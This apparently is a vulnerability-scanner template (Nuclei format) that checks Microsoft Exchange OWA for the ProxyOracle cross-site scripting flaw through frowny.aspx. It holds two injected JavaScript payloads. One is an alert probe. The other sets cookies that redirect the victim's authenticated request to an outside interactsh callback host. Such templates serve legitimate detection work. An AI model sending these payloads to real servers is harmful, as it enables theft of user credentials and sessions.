id: proxyoracle-xss

info:
  author: Udyz
  name: ProxyOracle
  description: ProxyOracle Trigger The XSS
  severity: high
  tags: proxyoracle
  reference: |
      - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html

requests:
  - method: GET
    path:
      - "{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain);//"
      - "{{BaseURL}}/owa/auth/frowny.aspx?app=mail&et=ServerError&esrc=MasterPage&err=\&estack=}}};document.cookie=`X-AnonResource=true`;document.cookie=`X-AnonResource-Backend={{interactsh-url}}%23~1941962752`;var+xhr=new+XMLHttpRequest();xhr.open(`GET`,`https://localhost/owa/auth/a.js`,true);xhr.withCredentials=true;xhr.send(null);//"
      
    matchers:
      - type: status
        status:
          - 500
